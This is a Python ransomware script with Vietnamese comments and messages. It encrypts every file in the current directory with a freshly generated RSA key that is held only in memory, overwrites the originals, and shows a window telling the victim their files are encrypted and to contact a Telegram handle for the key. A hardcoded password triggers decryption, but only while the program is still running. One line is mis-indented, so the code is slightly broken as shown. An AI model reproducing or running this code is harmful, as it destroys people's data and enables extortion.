import os
import tkinter as tk
from tkinter import messagebox, simpledialog
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

global_private_key = None
def generate_random_public_key():
    global global_private_key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    public_key = private_key.public_key()
    try:
        with open("public_key_random.pem", "wb") as f:
            f.write(public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ))
        print("Khóa công khai đã được lưu thành công.")
    except Exception as e:
        print(f"Lỗi khi lưu khóa công khai: {e}")

    # Gán private key vào biến toàn cục (không lưu file)
    global_private_key = private_key
    print("Private key đã được gán thành công.")

    return public_key, private_key

def encrypt_files():
    public_key, _ = generate_random_public_key()  # Tạo khóa công khai và private key
        files_to_encrypt = [f for f in os.listdir() if not f.endswith(".pem") and f not in ["encryptor.exe", "madoc.py"]]
    if not files_to_encrypt:
        print("Không có tệp nào để mã hóa trong thư mục.")
        return

    for file in files_to_encrypt:
        if os.path.getsize(file) > 0:  # Kiểm tra kích thước file
            try:
                with open(file, "rb") as f:
                    data = f.read()
               
                # Mã hóa dữ liệu bằng public key
                encrypted = public_key.encrypt(
                    data,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                
                with open(file, "wb") as f:
                    f.write(encrypted)
                print(f"Tệp {file} đã được mã hóa thành công.")
            except Exception as e:
                print(f"Lỗi mã hóa tệp {file}: {e}")

def decrypt_all_files():
    global global_private_key
    if global_private_key is None:
        messagebox.showerror("Lỗi", "Private key không khả dụng!")
        return

    # Lấy các tệp cần giải mã (loại trừ các file .pem và file đặc biệt)
    files_to_decrypt = [f for f in os.listdir() if not f.endswith(".pem") and f != "encryptor.exe"]
    if not files_to_decrypt:
        messagebox.showinfo("Thông báo", "Không có tệp nào để giải mã trong thư mục.")
        return

    for file in files_to_decrypt:
        if os.path.getsize(file) > 0:
            try:
                with open(file, "rb") as f:
                    encrypted_data = f.read()               
                # Giải mã dữ liệu bằng private key
                decrypted = global_private_key.decrypt(
                    encrypted_data,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                
                with open(file, "wb") as f:
                    f.write(decrypted)
                print(f"Tệp {file} đã được giải mã thành công.")
            except Exception as e:
                print(f"Lỗi giải mã tệp {file}: {e}")
    
    messagebox.showinfo("Thành công", "Tất cả các tệp đã được giải mã thành công!")

def decrypt_gui():
    password = simpledialog.askstring("Nhập Private Key", "Nhập private key:")
    if password == "thinhdeptrai@":
        decrypt_all_files()
    else:
        messagebox.showerror("Lỗi", "Private key không đúng!")

def main():
    encrypt_files()# Mã hóa các tệp trong thư mục
    root = tk.Tk()
    root.title("Tệp của bạn đã bị mã hóa!")
    root.geometry("400x200") 

    label = tk.Label(root, text="Tất cả các tệp của bạn đã bị mã hóa!\n\nLiên hệ telegram Thịnh Đẹp Trai để lấy khóa giải.", font=("Arial", 12))
    label.pack(pady=10)

    decrypt_button = tk.Button(root, text="Giải mã tất cả tệp", command=decrypt_gui, bg="red", fg="white")
    decrypt_button.pack(pady=10)
    root.mainloop()
if __name__ == "__main__":
    main()
